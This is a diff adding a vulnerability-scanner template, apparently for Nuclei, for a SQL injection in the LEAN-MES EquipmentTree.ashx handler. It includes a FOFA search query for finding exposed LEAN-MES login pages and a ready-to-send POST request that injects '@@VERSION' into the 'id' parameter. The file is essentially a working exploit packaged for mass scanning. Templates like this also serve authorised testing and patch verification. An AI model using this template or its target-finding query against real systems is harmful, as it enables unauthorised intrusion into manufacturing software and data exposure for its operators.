@@ -1,0 +1,34 @@
+id: poc-nf0idfbdbrztvk5a
+info:
+  name: 深科特 LEAN-MES EquipmentTree.ashx 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nf0idfbdbrztvk5a'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: nf0idfbdbrztvk5a
+    fofa: (title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png")
+http:
+- raw:
+  - 'POST /Handler/EquipmentTree.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate, br
+
+    Connection: keep-alive
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
+
+
+    id=@@VERSION'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
